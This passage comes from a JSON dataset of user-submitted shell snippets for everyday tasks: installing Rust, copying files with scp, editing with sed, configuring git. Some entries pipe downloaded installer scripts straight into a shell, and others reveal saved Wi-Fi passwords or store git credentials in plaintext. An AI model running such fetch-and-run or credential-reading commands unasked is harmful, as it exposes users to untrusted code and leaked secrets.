    "title": " running ports in mac",
    "description": "sudo lsof -PiTCP -sTCP:LISTEN  COMMAND     PID      USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME GitHub      850 grgarside   6u   IPv4 0x23c345381d089301      0t0  TCP localhost:25035 (LISTEN)\nsudo lsof -PiTCP -sTCP:LISTEN\n$ npx kill-port 3000 8080 8081  Process on port 3000 killed Process on port 8080 killed Process on port 8081 killed \n",
    "reg_date": "2021-10-11T22:11:36.000Z"
  },
  {
    "id": 4211,
    "keyword": null,
    "link": null,
    "title": " rust",
    "description": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\nrustup component add rustfmt\nfn main() {     println!(\"Hello World!\"); } // Trying make C/C++ sound obselete \n",
    "reg_date": "2021-10-11T22:11:36.000Z"
  },
  {
    "id": 4212,
    "keyword": null,
    "link": null,
    "title": " rust install",
    "description": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\n# Windows curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh  # Mac or Linux curl https://sh.rustup.rs -sSf | sh\n",
    "reg_date": "2021-10-11T22:11:36.000Z"
  },
  {
    "id": 4213,
    "keyword": null,
    "link": null,
    "title": " rust install windows",
    "description": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\n# Windows curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh  # Mac or Linux curl https://sh.rustup.rs -sSf | sh\n",
    "reg_date": "2021-10-11T22:11:36.000Z"
  },
  {
    "id": 4214,
    "keyword": null,
    "link": null,
    "title": " rustup",
    "description": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\n",
    "reg_date": "2021-10-11T22:11:38.000Z"
  },
  {
    "id": 4215,
    "keyword": null,
    "link": null,
    "title": " rvm install new ruby version",
    "description": "$ ruby -v \t\t\t\t\t\t# Check ruby version  $ rvm install ruby-X.X.X        # Install specific ruby version $ rvm list\t\t\t\t\t\t# List ruby versions $ rvm use ruby-X.X.X\t\t\t# Choose a version to use $ rvm use ruby-X.X.X --default  # Set a version as default\n$ \\curl https://raw.githubusercontent.com/rvm/rvm/master/binscripts/rvm-installer | bash -s stable\n",
    "reg_date": "2021-10-11T22:11:38.000Z"
  },
  {
    "id": 4216,
    "keyword": null,
    "link": null,
    "title": " rvm uninstall ruby versions",
    "description": "# Removes the ruby, source files and optional gemsets / archives rvm remove ruby-x.x.x # Just removes the ruby - leaves everything else rvm uninstall ruby-x.x.x\n$ sudo rvm implode $ sudo rm -rf ~/.rvm $ sudo rm -rf /etc/rvmrc $ sudo rm -rf ~/.rvmrc $ sudo groupdel rvm \n",
    "reg_date": "2021-10-11T22:11:38.000Z"
  },
  {
    "id": 4217,
    "keyword": null,
    "link": null,
    "title": " s3cmd install",
    "description": "# for mac brew install s3cmd\n",
    "reg_date": "2021-10-11T22:11:38.000Z"
  },
  {
    "id": 4218,
    "keyword": null,
    "link": null,
    "title": " samtools extract sequence from bam file",
    "description": "# Basic syntax: # For a BAM file: samtools view file.bam | cut -f 10 > output.txt  # For a SAM file: cut -f 10 file.sam > output.txt\n",
    "reg_date": "2021-10-11T22:11:38.000Z"
  },
  {
    "id": 4219,
    "keyword": null,
    "link": null,
    "title": " samtools sam to fastq",
    "description": "# Basic syntax: samtools fastq input.bam > output.fastq\n",
    "reg_date": "2021-10-11T22:11:38.000Z"
  },
  {
    "id": 4220,
    "keyword": null,
    "link": null,
    "title": " save account to git",
    "description": "git config --global credential.helper store\n",
    "reg_date": "2021-10-11T22:11:38.000Z"
  },
  {
    "id": 4221,
    "keyword": null,
    "link": null,
    "title": " save android studio home bash profile",
    "description": "nano ~/.bash_profile   export ANDROID_HOME=/YOUR_PATH_TO/android-sdk export PATH=$ANDROID_HOME/platform-tools:$PATH export PATH=$ANDROID_HOME/tools:$PATH  source ~/.bash_profile echo $ANDROID_HOME\n",
    "reg_date": "2021-10-11T22:11:38.000Z"
  },
  {
    "id": 4222,
    "keyword": null,
    "link": null,
    "title": " sbt download for ubuntu",
    "description": "echo \"deb https://dl.bintray.com/sbt/debian /\" | sudo tee -a /etc/apt/sources.list.d/sbt.list curl -sL \"https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x2EE0EA64E40A89B84B2DF73499E82A75642AC823\" | sudo apt-key add sudo apt-get update sudo apt-get install sbt \n",
    "reg_date": "2021-10-11T22:11:39.000Z"
  },
  {
    "id": 4223,
    "keyword": null,
    "link": null,
    "title": " sbt scala install ubuntu",
    "description": "echo \"deb https://dl.bintray.com/sbt/debian /\" | sudo tee -a /etc/apt/sources.list.d/sbt.list curl -sL \"https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x2EE0EA64E40A89B84B2DF73499E82A75642AC823\" | sudo apt-key add sudo apt-get update sudo apt-get install sbt \n",
    "reg_date": "2021-10-11T22:11:39.000Z"
  },
  {
    "id": 4224,
    "keyword": null,
    "link": null,
    "title": " scan for ip addresses",
    "description": "arp -a\n",
    "reg_date": "2021-10-11T22:11:39.000Z"
  },
  {
    "id": 4225,
    "keyword": null,
    "link": null,
    "title": " schedule shell script mac",
    "description": "env EDITOR=nano crontab -e 0  3  *  *  *  sh /path/to/your/file ----- (format: min  hour  day_of_month  month  day_of_week  your_command)\n",
    "reg_date": "2021-10-11T22:11:39.000Z"
  },
  {
    "id": 4226,
    "keyword": null,
    "link": null,
    "title": " scp all files in directory",
    "description": "scp -r myfoldername root@315.915.237.191:/home/myfoldername\nscp -r \"${PWD}\" ${remote}:${dst_path}\n",
    "reg_date": "2021-10-11T22:11:39.000Z"
  },
  {
    "id": 4227,
    "keyword": null,
    "link": null,
    "title": " scp connection refused",
    "description": "# try to install those two sudo apt install openssh-server sudo apt install openssh-client\n",
    "reg_date": "2021-10-11T22:11:39.000Z"
  },
  {
    "id": 4228,
    "keyword": null,
    "link": null,
    "title": " scp send file",
    "description": "# Basic syntax: scp source destination  # Note, usually one or both of \"source\" and \"destination\" are remote  # \t(otherwise you'd just use cp for a local copy) # To specify a local source or destination, just use the directory path # To specify a remote destination, the format is: # user@remote.server.com:/path/to/directory  # Example usage: scp /Users/name/Downloads/*.txt user@remote.server.com:/path/to/directory # In this example, you'd be uploading all text files from your downloads  # to the remote server  scp user@remote.server.com:/path/to/directory/*png /Users/name/Downloads # In this example, you'd be downloading all png files from the remote # server to your downloads directory  scp user@remote.server.com:/path/to/directory/my_favorite_file.txt user@other.remote.server.com:/path/to/directory # In this example, you'd be moving a file from one remote server to  # another remote server  scp -r user@remote.server.com:/path/to/directory /Users/name/Downloads # In this example the -r flag is used to state that this is a recursive # download, meaning that all files and subdirectories in the directory # will be downloaded to the local Downloads directory\nscp ./file.txt remote_username@remote_ip:/remote/directory\nscp -r user@your.server.example.com:/path/to/foo /home/user/Desktop/\nscp remote_username@10.10.0.2:/remote/file.txt /local/directory\nscp file.txt remote_username@10.10.0.2:/remote/directory\ndragonmnl@local $ scp -P 2222 file.ext username@domain:~/  \n",
    "reg_date": "2021-10-11T22:11:39.000Z"
  },
  {
    "id": 4229,
    "keyword": null,
    "link": null,
    "title": " scp ssh stackoverflow",
    "description": "# download: remote -> local scp user@remote_host:remote_file local_file   # upload: local -> remote scp local_file user@remote_host:remote_file\n",
    "reg_date": "2021-10-11T22:11:39.000Z"
  },
  {
    "id": 4230,
    "keyword": null,
    "link": null,
    "title": " scp to remote server",
    "description": "scp ./file.txt remote_username@remote_ip:/remote/directory\nscp username@remote:/file/to/send /where/to/put\nscp -i <private_key> ./file.txt remote_username@remote_ip:/remote/directory\nscp /users/Edward/desktop root@191.162.0.2:/writing/article\ndragonmnl@local $ scp -P 2222 file.ext username@domain:~/  \n",
    "reg_date": "2021-10-11T22:11:40.000Z"
  },
  {
    "id": 4231,
    "keyword": null,
    "link": null,
    "title": " screen kill all",
    "description": "screen -X -S SCREENID kill \nkillall screen\nfor scr in $(screen -ls | awk '{print $1}'); do screen -S $scr -X kill; done\n$ screen -X -S [session # you want to kill] quit \nscreen -X -S [session # you want to kill] kill \nscreen -wipe\n",
    "reg_date": "2021-10-11T22:11:40.000Z"
  },
  {
    "id": 4232,
    "keyword": null,
    "link": null,
    "title": " screen recorder for ubuntu",
    "description": "sudo add-apt-repository ppa:maarten-baert/simplescreenrecorder sudo apt update sudo apt install simplescreenrecorder\nsudo apt install kazam\nsudo add-apt-repository ppa:maarten-baert/simplescreenrecorder sudo apt-get update sudo apt-get install simplescreenrecorder\nsudo add-apt-repository ppa:fossproject/ppa sudo apt update sudo apt install green-recorder\n",
    "reg_date": "2021-10-11T22:11:40.000Z"
  },
  {
    "id": 4233,
    "keyword": null,
    "link": null,
    "title": " screen recorder linux",
    "description": "sudo add-apt-repository ppa:maarten-baert/simplescreenrecorder sudo apt update sudo apt install simplescreenrecorder\nsudo apt install kazam\nsudo add-apt-repository ppa:maarten-baert/simplescreenrecorder sudo apt-get update sudo apt-get install simplescreenrecorder\nsudo add-apt-repository ppa:fossproject/ppa sudo apt update sudo apt install green-recorder\n",
    "reg_date": "2021-10-11T22:11:40.000Z"
  },
  {
    "id": 4234,
    "keyword": null,
    "link": null,
    "title": " screen recorder ubuntu",
    "description": "sudo add-apt-repository ppa:maarten-baert/simplescreenrecorder sudo apt update sudo apt install simplescreenrecorder\nsudo apt install kazam\nsudo add-apt-repository ppa:maarten-baert/simplescreenrecorder sudo apt-get update sudo apt-get install simplescreenrecorder\nsudo add-apt-repository ppa:fossproject/ppa sudo apt update sudo apt install green-recorder\n",
    "reg_date": "2021-10-11T22:11:40.000Z"
  },
  {
    "id": 4235,
    "keyword": null,
    "link": null,
    "title": " scss in gatsby",
    "description": "npm install gatsby-plugin-sass node-sass  # yarn yarn add gatsby-plugin-sass node-sass\n",
    "reg_date": "2021-10-11T22:11:41.000Z"
  },
  {
    "id": 4236,
    "keyword": null,
    "link": null,
    "title": " sdkman install",
    "description": "$ curl -s \"https://get.sdkman.io\" | bash source \"$HOME/.sdkman/bin/sdkman-init.sh\"\n$ curl -s \"https://get.sdkman.io\" | bash\n",
    "reg_date": "2021-10-11T22:11:41.000Z"
  },
  {
    "id": 4237,
    "keyword": null,
    "link": null,
    "title": " search all folders for file match linux",
    "description": "find . -name \"foo*\"\n",
    "reg_date": "2021-10-11T22:11:41.000Z"
  },
  {
    "id": 4238,
    "keyword": null,
    "link": null,
    "title": " search by netstat by port",
    "description": "netstat -na | find \"8080\" \nsudo netstat -nap | grep :80 or sudo lsof -i:80\n",
    "reg_date": "2021-10-11T22:11:41.000Z"
  },
  {
    "id": 4239,
    "keyword": null,
    "link": null,
    "title": " search by service terminal",
    "description": "ps aux | grep httpd\n",
    "reg_date": "2021-10-11T22:11:41.000Z"
  },
  {
    "id": 4240,
    "keyword": null,
    "link": null,
    "title": " search for ADS",
    "description": "//paste in PowerShell inside the folder that you want to search // gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'\n",
    "reg_date": "2021-10-11T22:11:41.000Z"
  },
  {
    "id": 4241,
    "keyword": null,
    "link": null,
    "title": " search for filename recursively linux",
    "description": "find . -name \"foo*\"\n$ grep -r \"String to be searched goes here\" *\n",
    "reg_date": "2021-10-11T22:11:41.000Z"
  },
  {
    "id": 4242,
    "keyword": null,
    "link": null,
    "title": " search for ip addresses on network",
    "description": "arp -a\n",
    "reg_date": "2021-10-11T22:11:41.000Z"
  },
  {
    "id": 4243,
    "keyword": null,
    "link": null,
    "title": " search for port localhost mac",
    "description": "sudo lsof -PiTCP -sTCP:LISTEN  COMMAND     PID      USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME GitHub      850 grgarside   6u   IPv4 0x23c345381d089301      0t0  TCP localhost:25035 (LISTEN)\n",
    "reg_date": "2021-10-11T22:11:41.000Z"
  },
  {
    "id": 4244,
    "keyword": null,
    "link": null,
    "title": " search in centos terminal",
    "description": "find / -name \"filename\"\n",
    "reg_date": "2021-10-11T22:11:42.000Z"
  },
  {
    "id": 4245,
    "keyword": null,
    "link": null,
    "title": " sed print a specific line",
    "description": "sed -n 5p <file>\n",
    "reg_date": "2021-10-11T22:11:42.000Z"
  },
  {
    "id": 4246,
    "keyword": null,
    "link": null,
    "title": " sed remove empty lines",
    "description": "sed '/^$/d' /tmp/data.txt\n",
    "reg_date": "2021-10-11T22:11:42.000Z"
  },
  {
    "id": 4247,
    "keyword": null,
    "link": null,
    "title": " sed remove line containing",
    "description": "sed '/pattern to match/d' ./infile\n# Delete all lines starting with '#' $ sed -i '/^#/d' filepath\nUse d option at the end of sed command string for deleting line of matches. tac | sed -i \"\" \"s/matching_pattern/I+1 d\" file.txt | tac #\n# -i here update the file, try with and without -i,  sed -i -e \"/your_pattern/d\" file  sed -i -e \"/your_pattern/,+2 d\" file  # 2 lines after the pattern sed -i -e '5,5d\"  # remove 5th line\n$ sed 's|http://||' <<EOL http://url1.com http://url2.com http://url3.com EOL \nUse d option at the end of sed command string for deleting line of matches. sed -i \"\" \"s/matching_pattern/d\" file.txt\n",
    "reg_date": "2021-10-11T22:11:42.000Z"
  },
  {
    "id": 4248,
    "keyword": null,
    "link": null,
    "title": " sed remove space",
    "description": "sed 's/ //g' filename\n",
    "reg_date": "2021-10-11T22:11:42.000Z"
  },
  {
    "id": 4249,
    "keyword": null,
    "link": null,
    "title": " sed replace in file",
    "description": "sed -i 's/old-text/new-text/g' input.txt\nsed -i 's/foo/bar/g' hello.txt\nJust concatenate var '\"$var\"' to replace values string in sed command: $ sed -i 's/string_to_replace/'\"$var\"'/g' file_to_replace.txt\n#on my mac sed -i -e 's/old-text/new-text/g' text.txt\nsed -e s/deletethis//g -i * \nFor using match in sed replacement, just border it with '\\(' and '\\)': echo Before123 | sed 's/Before\\([0-9]*\\)/\\1After/g' 123After\t# number is matched withtin '\\( \\)' and replaced in '\\1' Example with 2 match replacements echo a_b | sed 's/\\(^.*\\)_\\(.*$\\)/first is \\1 and \\2 is after/g'\n",
    "reg_date": "2021-10-11T22:11:42.000Z"
  },
  {
    "id": 4250,
    "keyword": null,
    "link": null,
    "title": " sed replace number of variable length",
    "description": "Just use one of following commands for replacing a number of: sed \"s/[0-9]//\" f.txt\t#One single digit as 1 sed \"s/[0-9]\\+//\" f.txt #Further digits as 837, specifying match repetition \"\\+\" sed \"s/[0-9\\+\\.[0-9]\\+]//\" file.txt #Float type with decimals\n",
    "reg_date": "2021-10-11T22:11:42.000Z"
  },
  {
    "id": 4251,
    "keyword": null,
    "link": null,
    "title": " see ADS content",
    "description": "//paste in PowerShell to see the data of a given ADS inside a file // Get-Content -path {path to the file} -stream {name of stream}\n",
    "reg_date": "2021-10-11T22:11:42.000Z"
  },
  {
    "id": 4252,
    "keyword": null,
    "link": null,
    "title": " see all ADS in a file",
    "description": "//paste in PowerShell to show all the streams of a given file // Get-Item -path {path to the file} -stream *\n",
    "reg_date": "2021-10-11T22:11:42.000Z"
  },
  {
    "id": 4253,
    "keyword": null,
    "link": null,
    "title": " see all apps linux",
    "description": "sudo dpkg --get-selections\nUse this command on ubuntu: > sudo dpkg --listfiles [appname]\n",
    "reg_date": "2021-10-11T22:11:43.000Z"
  },
  {
    "id": 4254,
    "keyword": null,
    "link": null,
    "title": " see apache version ubuntu",
    "description": "apache2 -v\napache2 -v    \n",
    "reg_date": "2021-10-11T22:11:43.000Z"
  },
  {
    "id": 4255,
    "keyword": null,
    "link": null,
    "title": " see git ignored files",
    "description": "git status --ignored\n",
    "reg_date": "2021-10-11T22:11:43.000Z"
  },
  {
    "id": 4256,
    "keyword": null,
    "link": null,
    "title": " see list of globally installed npm packages mac",
    "description": "npm list -g --depth 0\n",
    "reg_date": "2021-10-11T22:11:43.000Z"
  },
  {
    "id": 4257,
    "keyword": null,
    "link": null,
    "title": " see password wifi windows 10",
    "description": "NETSH WLAN SHOW PROFILE WIFI KEY=CLEAR \nnetsh wlan show profile name=WIFI-NAME key=clear\n",
    "reg_date": "2021-10-11T22:11:43.000Z"
  },
  {
    "id": 4258,
    "keyword": null,
    "link": null,
    "title": " see saved wifi password ubuntu",
    "description": "nmcli device wifi show-password\n",
    "reg_date": "2021-10-11T22:11:43.000Z"
  },
  {
    "id": 4259,
    "keyword": null,
    "link": null,
    "title": " see ssh key",
    "description": "cat ~/.ssh/id_ed25519.pub\n$ ls -al ~/.ssh # Lists the files in your .ssh directory, if they exist\n# see SSH key List ~/.ssh # see public key from existing file cat ~/ssh/<filename>.pub\ncd ~/.ssh ls cat key_name.pub\n",
    "reg_date": "2021-10-11T22:11:43.000Z"
  },
  {
    "id": 4260,
    "keyword": null,
    "link": null,
    "title": " see total space available in shell",
    "description": "df -hx squashfs --total\n",
    "reg_date": "2021-10-11T22:11:43.000Z"
  },
  {
    "id": 4261,
    "keyword": null,
    "link": null,
    "title": " see ubunut environment variables",
    "description": "printenv\n",
    "reg_date": "2021-10-11T22:11:44.000Z"
  },
  {
    "id": 4262,
    "keyword": null,
    "link": null,
    "title": " see what is using a port ubuntu",
    "description": "sudo ufw allow 1191/tcp\n$ sudo lsof -i:22\n",
    "reg_date": "2021-10-11T22:11:44.000Z"
  },
  {
    "id": 4263,
    "keyword": null,
    "link": null,
    "title": " seed specific seeder laravel",
    "description": "#All of them php artisan db:seed #One class php artisan db:seed --class=UserSeeder\nphp artisan db:seed --class=UserSeeder\nphp artisan db:seed --class=NameOfSeeder\nphp artisan make:seeder NameOfTheSeeder\nphp artisan migrate:fresh --seed\n<?php  use Illuminate\\Database\\Seeder; use Illuminate\\Support\\Facades\\DB; use Illuminate\\Support\\Facades\\Hash; use Illuminate\\Support\\Str;  class DatabaseSeeder extends Seeder {     /**      * Run the database seeds.      *      * @return void      */     public function run()     {         DB::table('users')->insert([             'name' => Str::random(10),             'email' => Str::random(10).'@gmail.com',             'password' => Hash::make('password'),         ]);     } }\n",
    "reg_date": "2021-10-11T22:11:44.000Z"
  },
  {
    "id": 4264,
    "keyword": null,
    "link": null,
    "title": " select first character string bash",
    "description": "foo=\"bar\" echo ${foo:0:1}   #{str:position:length} #returns f\n",
    "reg_date": "2021-10-11T22:11:44.000Z"
  },
  {
    "id": 4265,
    "keyword": null,
    "link": null,
    "title": " self-documenting makefile",
    "description": ".PHONY: help  help: \t@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | sort | awk 'BEGIN {FS = \":.*?## \"}; {printf \"\\033[36m%-30s\\033[0m %s\\n\", $$1, $$2}'  # All rules with double-hash comments will be automatically displayed in the make help rule newrule: ## This is what will show up for this rule's help \techo Hello World\n.PHONY: help  help: \t@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | sort | awk 'BEGIN {FS = \":.*?## \"}; {printf \"\\033[36m%-30s\\033[0m %s\\n\", $$1, $$2}'\n",
    "reg_date": "2021-10-11T22:11:44.000Z"
  },
  {
    "id": 4266,
    "keyword": null,
    "link": null,
    "title": " semantic ui react npm install",
    "description": "npm install semantic-ui-react\nyarn add semantic-ui-react\n",
    "reg_date": "2021-10-11T22:11:44.000Z"
  },
  {
    "id": 4267,
    "keyword": null,
    "link": null,
    "title": " send email with attachment from shell script",
    "description": "#install mailutils $ sudo apt-get install mailutils #comment to send a mail $ echo \"Message Body Here\" | mail -s \"Subject Here\" user@example.com -A backup.zip or $ echo \"Message Body Here\" | mailx -s \"Subject Here\" -a backup.zip user@example.com or $ echo \"Message Body Here\" | mailx -s \"Subject Here\" -a backup.log -a test.txt user@example.com\n$ cat /path/to/file | mail -s \"your subject\" your@email.com\n",
    "reg_date": "2021-10-11T22:11:44.000Z"
  },
  {
    "id": 4268,
    "keyword": null,
    "link": null,
    "title": " send files via ssh",
    "description": "Syntax: scp <source> <destination>  To copy a file from B to A while logged into B: scp /path/to/file username@a:/path/to/destination  To copy a file from B to A while logged into A: scp username@b:/path/to/file /path/to/destination\nscp <source> <destination>  #To copy a file from B to A while logged into B: scp /path/to/file username@a:/path/to/destination  #To copy a file from B to A while logged into A: scp username@b:/path/to/file /path/to/destination\ncp original_file new_file \n",
    "reg_date": "2021-10-11T22:11:44.000Z"
  },
  {
    "id": 4269,
    "keyword": null,
    "link": null,
    "title": " sequlize create new migraion",
    "description": "npx sequelize migration:generate --name [name_of_your_migration]\n",
    "reg_date": "2021-10-11T22:11:44.000Z"
  },
  {
    "id": 4270,
    "keyword": null,
    "link": null,
    "title": " serial number linux",
    "description": "sudo dmidecode -t system | grep Serial\n",
    "reg_date": "2021-10-11T22:11:45.000Z"
  },
  {
    "id": 4271,
    "keyword": null,
    "link": null,
    "title": " serve current directory from command line",
    "description": "#Simplest way possible (thanks Aaron Patterson/n0kada):  ruby -run -e httpd . -p 9090  # I have this in my  .bashrc :  function serve {   port=\"${1:-3000}\"   ruby -run -e httpd . -p $port }  # It serves the current directory on port 3000 by default, but you can also specify the port:  ~ $ cd tmp ~/tmp $ serve      # ~/tmp served on port 3000 ~/tmp $ cd ../www ~/www $ serve 5000   # ~/www served on port 5000\n",
    "reg_date": "2021-10-11T22:11:45.000Z"
  },
  {
    "id": 4272,
    "keyword": null,
    "link": null,
    "title": " serverless log fucntion",
    "description": "serverless logs -f hello  # Optionally tail the logs with -t serverless logs -f hello -t\n",
    "reg_date": "2021-10-11T22:11:45.000Z"
  },
  {
    "id": 4273,
    "keyword": null,
    "link": null,
    "title": " set ADS content",
    "description": "//paste in PowerShell to set the content of a specified ADS // //will OVERWRITE previous content // set-content -path {path to the file} -stream {name of the stream}\n",
    "reg_date": "2021-10-11T22:11:45.000Z"
  },
  {
    "id": 4274,
    "keyword": null,
    "link": null,
    "title": " set alias for directory in powershell",
    "description": "#For Windows PowerShell set-alias -name <alias_name> -value <command> #<alias_name> is the new alias name you want to set. #<command> is the command you want to alias. #NB: this is temporal and will not work when powershell is reboot. #To make it permanent, add it to PowerShell Profile.ps1 file.\n#For Windows PowerShell function <alias_name> {cd \"C:\\Users...\"} #We use `function` and not  set-alias -name <new_alias> -value <command> #because cmdlets(cd) don't work in set-alias -value. #NB: this is temporal and will not work when powershell is rebooted. #To make it permanent, add it to PowerShell Profile.ps1 file.\nPS> Set-Alias -Name list -Value Get-ChildItem  PS> Get-Alias -Name list  CommandType     Name -----------     ---- Alias           list -> Get-ChildItem\n// create a profile.ps1 file to set aliases notepad $((Split-Path $profile -Parent) + \"\\profile.ps1\")  // example aliases (opens notepad when you type `edit` in console) Set-Alias edit notepad.exe  // example aliases (opens notepad when you type `edit` in console) Set-Alias edit1 \"C:\\Program Files\\Windows NT\\Accessories\\wordpad.exe\"\nset-theme [some themes]\n",
    "reg_date": "2021-10-11T22:11:45.000Z"
  },
  {
    "id": 4275,
    "keyword": null,
    "link": null,
    "title": " set alias in ubuntu",
    "description": "# open terminal  Ctrl+Alt+T  # open ~/.bashrc_alias by running gedit ~/.bashrc_alias # the file opened might be empty  # add you aliases and commands one alias in a line alias name_of_alias=\"command you want to execute\" alias name_of_another_alias=\"another command you want to execute\"  # save  Ctrl+S  # for immediate effect run in terminal source ~/.bashrc_alias\nsudo nano ~/.bashrc  #at the end of the file, add your alias alias name_of_alias=\"your_command\" #save the file  source ~/.bashrc\nprintf \"%s\\n\" \"alias shh='sqlplus hfdora/hfdora@hfd1\" >> ~/.bashrc source ~/.bashrc # for immediate effect  #or add your alias to ~/.bashrc directly\nalias l=\"ls -al\" \n# syntax # alias *<alias-name>=\"*<what-alias-represents>\"  # example alias ll=\"ls -lrt\"\n",
    "reg_date": "2021-10-11T22:11:45.000Z"
  },
  {
    "id": 4276,
    "keyword": null,
    "link": null,
    "title": " set default java version",
    "description": "# on linux sudo update-alternatives --config java # then just input the number of the jdk you # want to use as default and hit Enter\n/usr/libexec/java_home -V   export JAVA_HOME=`/usr/libexec/java_home -v 1.6.0_65-b14-462` //java 8\n",
    "reg_date": "2021-10-11T22:11:45.000Z"
  },
  {
    "id": 4277,
    "keyword": null,
    "link": null,
    "title": " set different user for git",
    "description": "git config user.email work@example.com git config user.name \"work user name\"\n",
    "reg_date": "2021-10-11T22:11:45.000Z"
  },
  {
    "id": 4278,
    "keyword": null,
    "link": null,
    "title": " set email git",
    "description": "git config --global user.email \"my.adresse@hotmail.com\" git config --global user.name \"My Name\"\ngit config --global user.email \"my.adresse@hotmail.com\"\ngit config --global user.name \"My Name\"\n# For setting inside project folder git config user.name \"Neeraj Singh\" git config user.email 'nnneerajjj@gmail.com'\n$ git config --global user.email \"email@example.com\"\n",
    "reg_date": "2021-10-11T22:11:46.000Z"
  },
  {
    "id": 4279,
    "keyword": null,
    "link": null,
    "title": " set environamnt variable in service linux",
    "description": "[Service] Environment=\"SECRET=pGNqduRFkB4K9C2vijOmUDa2kPtUhArN\" Environment=\"ANOTHER_SECRET=JP8YLOc2bsNlrGuD6LVTq7L36obpjzxd\" \n",
    "reg_date": "2021-10-11T22:11:46.000Z"
  },
  {
    "id": 4280,
    "keyword": null,
    "link": null,
    "title": " set execution policy powershell",
    "description": " Set-ExecutionPolicy RemoteSigned  # to set the policy to RemoteSigned.  Set-ExecutionPolicy Unrestricted  # to set the policy to Unrestricted.  Get-ExecutionPolicy # to verify the current settings for the execution policy.\nSet-ExecutionPolicy -ExecutionPolicy <PolicyName> # general syntax Set-ExecutionPolicy -ExecutionPolicy RemoteSigned # for example\nSelect Start > All Programs > Windows PowerShell version > Windows PowerShell. Type Set-ExecutionPolicy RemoteSigned to set the policy to RemoteSigned. Type Set-ExecutionPolicy Unrestricted to set the policy to Unrestricted. Type Get-ExecutionPolicy to verify the current settings for the execution policy.\n",
    "reg_date": "2021-10-11T22:11:46.000Z"
  },
  {
    "id": 4281,
    "keyword": null,
    "link": null,
    "title": " set git credentials so that i never ask for username and password while pushin",
    "description": "git config --global credential.helper store  git config --global credential.helper cache\n",
    "reg_date": "2021-10-11T22:11:46.000Z"
  },
  {
    "id": 4282,
    "keyword": null,
    "link": null,
    "title": " set git editor",
    "description": "$ git config --global core.editor vim\ngit config --global core.editor nvim\n$ git config --global core.editor emacs\n",
    "reg_date": "2021-10-11T22:11:46.000Z"
  },
  {
    "id": 4283,
    "keyword": null,
    "link": null,
    "title": " set git editor to vim",
    "description": "git config --global core.editor \"vim\"\n",
    "reg_date": "2021-10-11T22:11:46.000Z"
  },
  {
    "id": 4284,
    "keyword": null,
    "link": null,
    "title": " set git origin",
    "description": " git remote -v  git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\ngit remote set-url origin git@accountname.git.beanstalkapp.com:/your-repository.git\ngit remote add origin git@git.assembla.com:portfolio/space.space_name.git\ngit remote add origin git@github.com:nikhilbhardwaj/abc.git\ngit remote add origin <git_url>\n",
    "reg_date": "2021-10-11T22:11:46.000Z"
  },
  {
    "id": 4285,
    "keyword": null,
    "link": null,
    "title": " set git pull rebase default",
    "description": "## command git pull --rebase  ## configs # git version >= 1.7.9 git config --global pull.rebase true # git version < 1.7.9 git config --global branch.autosetuprebase always\n",
    "reg_date": "2021-10-11T22:11:46.000Z"
  },
  {
    "id": 4286,
    "keyword": null,
    "link": null,
    "title": " set hostname centos 7",
    "description": "hostnamectl set-hostname <mention the host name>\n# hostnamectl set-hostname your-new-hostname \n",
    "reg_date": "2021-10-11T22:11:46.000Z"
  },
  {
    "id": 4287,
    "keyword": null,
    "link": null,
    "title": " set hostname on command line ec2",
    "description": "sudo hostnamectl set-hostname yourhostname\n",
    "reg_date": "2021-10-11T22:11:47.000Z"
  },
  {
    "id": 4288,
    "keyword": null,
    "link": null,
    "title": " set password to root ubuntu 20.04",
    "description": "$ sudo -i $ passwd root new password:... confirm password:...\n",
    "reg_date": "2021-10-11T22:11:47.000Z"
  },
  {
    "id": 4289,
    "keyword": null,
    "link": null,
    "title": " set path environemnt variables windows 10",
    "description": "set PATH=%PATH%;C:\\your\\path\\here\\\n",
    "reg_date": "2021-10-11T22:11:47.000Z"
  },
  {
    "id": 4290,
    "keyword": null,
    "link": null,
    "title": " set pin on mcp23017 using raspberry pi shell",
    "description": "# for original rev1 Pi sudo i2cset -y 0 0x20 0x00 0xff sudo i2cset -y 0 0x20 0x14 0x01 #           address register value  # for rev2 Pi or later sudo i2cset -y 1 0x20 0x00 0xff sudo i2cset -y 1 0x20 0x14 0x01 #           address register value \n",
    "reg_date": "2021-10-11T22:11:47.000Z"
  },
  {
    "id": 4291,
    "keyword": null,
    "link": null,
    "title": " set sublime text as git editor",
    "description": "git config --global core.editor \"'C:\\Program Files\\Sublime Text 3\\subl.exe' --wait --new-window\"\n",
    "reg_date": "2021-10-11T22:11:47.000Z"
  },
  {
    "id": 4292,
    "keyword": null,
    "link": null,
    "title": " set up git repository",
    "description": "# New local repository git init git add . git commit -m \"Initial commit\"  # New remote repository # Create remote repository (likely on github), then: git remote add origin https://github.com/username/new_repo #https git remote add origin git@github.com:username/new_repo #ssh # Now push git push -u origin master\ngit init git add somefile git commit -m \"initial commit\" git remote add origin https://github.com/username/new_repo git push -u origin master \n# New local repository git init git add . git commit -m \"Initial commit\"  # New remote repository git remote add origin git@github.com:username/new_repo #ssh # Now push git push -u origin master\n",
    "reg_date": "2021-10-11T22:11:47.000Z"
  },
  {
    "id": 4293,
    "keyword": null,
    "link": null,
    "title": " set username git",
    "description": "To set your global username/email configuration: Open the command line. Set your username: git config --global user.name \"FIRST_NAME LAST_NAME\" Set your email address: git config --global user.email \"MY_NAME@example.com\" To set repository-specific username/email configuration: From the command line, change into the repository directory. Set your username: git config user.name \"FIRST_NAME LAST_NAME\" Set your email address: git config user.email \"MY_NAME@example.com\" Verify your configuration by displaying your configuration file: cat .git/config\ngit config --global user.name \"My Name\"\n$ git config --global user.email \"email@example.com\"\n$ git config --global user.name \"Mona Lisa\"\ngit config --global user.name \"Your Name Here\" git config --global user.email your@email.com\n$ git config --global user.name > Mona Lisa\n",
